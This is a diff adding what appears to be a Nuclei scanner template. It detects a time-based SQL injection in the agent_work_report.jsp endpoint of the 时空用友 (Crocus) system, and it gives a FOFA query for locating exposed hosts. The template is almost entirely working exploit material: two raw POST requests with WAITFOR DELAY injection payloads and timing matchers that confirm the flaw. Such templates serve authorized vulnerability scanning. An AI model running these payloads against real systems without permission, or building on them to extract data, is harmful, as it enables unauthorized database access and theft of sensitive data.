@@ -1,0 +1,36 @@
+id: shikong-yongyou-agent_work_report-sql-injection
+info:
+  name: 时空用友 agent_work_report SQL注入
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+    reference: https://nvd.nist.gov/vuln/detail/CVE-2026-XXXXX
+    时空用友系统的 agent_work_report 接口存在SQL注入缺陷。攻击者利用未过滤的用户输入，构造恶意SQL语句，可导致数据库权限获取、敏感数据泄露及系统权限控制失效。
+  tags: 时空用友
+http:
+- raw:
+  - |
+    POST /worksheet/agent_work_report.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    id=1';WAITFOR DELAY '0:0:5'--
+  - |
+    POST /worksheet/agent_work_report.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    id=1';WAITFOR DELAY '0:0:8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
